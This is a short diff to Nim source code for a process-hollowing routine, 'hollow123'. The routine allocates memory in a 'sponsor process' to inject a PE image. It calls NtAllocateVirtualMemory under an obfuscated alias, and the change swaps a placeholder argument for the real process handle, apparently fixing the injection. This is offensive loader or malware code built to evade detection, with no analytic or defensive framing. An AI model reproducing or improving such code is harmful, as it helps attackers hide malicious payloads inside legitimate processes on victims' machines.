@@ -139,7 +139,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
         when not defined(release): echo "[*] Allocating memory in sponsor process (preferred address)"   
         var newImageBaseAddress = peImageImageBase
         res = CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
-            1, # sponsorProcessHandle,
+            sponsorProcessHandle,
             addr newImageBaseAddress,
             0,
             addr peImageSize,
